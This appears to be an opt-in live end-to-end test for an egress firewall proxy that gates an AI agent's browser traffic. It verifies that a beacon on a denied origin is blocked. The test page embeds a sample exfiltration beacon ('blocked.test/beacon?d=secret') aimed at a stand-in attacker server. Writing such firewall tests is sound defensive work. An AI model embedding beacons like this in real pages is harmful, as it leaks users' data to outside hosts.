/**
 * LIVE e2e (opt-in: LATTICE_LIVE_ENGINE=1) — the egress firewall on the REAL
 * agent path. A real agent-browser session is launched with HTTP_PROXY pointing
 * at the EgressProxy. We navigate to an ALLOWED origin whose page embeds a
 * sub-resource on a DENIED origin, and prove:
 *   - the allowed origin is forwarded (page loads),
 *   - the denied origin is blocked at the proxy and the "attacker" server is
 *     NEVER reached.
 *
 * Not a mock: the request really leaves Chrome and is gated by the proxy before
 * it can reach the network.
 */

import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { createServer, type Server } from "node:http";
import { EgressProxy, originAllowlist } from "./index.js";
import { AgentBrowserEngine } from "@lattice/engine-adapter";

const live = process.env["LATTICE_LIVE_ENGINE"] === "1";
const describeLive = live ? describe : describe.skip;

function startServer(handler: (count: number) => string): Promise<{ server: Server; port: number; hits: () => number }> {
  let count = 0;
  return new Promise((resolve) => {
    const server = createServer((_req, res) => {
      count++;
      res.writeHead(200, { "Content-Type": "text/html" }).end(handler(count));
    });
    server.listen(0, "127.0.0.1", () => resolve({ server, port: (server.address() as { port: number }).port, hits: () => count }));
  });
}

describeLive("egress firewall — live, real agent-browser through the proxy", () => {
  let allowSrv: Awaited<ReturnType<typeof startServer>>;
  let blockSrv: Awaited<ReturnType<typeof startServer>>;
  let proxy: EgressProxy;
  let engine: AgentBrowserEngine;

  beforeAll(async () => {
    // The allowed page embeds a beacon on the DENIED origin.
    allowSrv = await startServer(() => `<!doctype html><html><body>OK<img src="http://blocked.test/beacon?d=secret"></body></html>`);
    blockSrv = await startServer(() => `should-never-be-served`);
    proxy = new EgressProxy({
      allow: originAllowlist(["http://allow.test"], []), // ONLY the task origin
      hostMap: { "allow.test": `127.0.0.1:${allowSrv.port}`, "blocked.test": `127.0.0.1:${blockSrv.port}` },
    });
    const { url } = await proxy.start();
    engine = new AgentBrowserEngine();
    await engine.launch({ proxyUrl: url });
  }, 60_000);

  afterAll(async () => {
    await engine?.shutdown().catch(() => undefined);
    await proxy?.stop();
    await new Promise<void>((r) => allowSrv.server.close(() => r()));
    await new Promise<void>((r) => blockSrv.server.close(() => r()));
  });

  it("forwards the allowed origin and BLOCKS the denied beacon (attacker never reached)", async () => {
    const session = await engine.createSession();
    try {
      await session.navigate("http://allow.test/");
      // The beacon loads asynchronously after the document; poll for its decision.
      const deadline = Date.now() + 8000;
      while (Date.now() < deadline && !proxy.decisions.some((d) => d.origin === "http://blocked.test")) {
        await new Promise((r) => setTimeout(r, 200));
      }

      const allowed = proxy.decisions.filter((d) => d.origin === "http://allow.test" && d.allowed);
      const blocked = proxy.decisions.filter((d) => d.origin === "http://blocked.test" && !d.allowed);

      expect(allowed.length, "allowed origin was forwarded through the proxy").toBeGreaterThan(0);
      expect(blocked.length, "denied beacon was blocked at the proxy").toBeGreaterThan(0);
      // The attacker server received NOTHING — the block was before the network.
      expect(blockSrv.hits()).toBe(0);
    } finally {
      await session.close().catch(() => undefined);
    }
  }, 60_000);
});
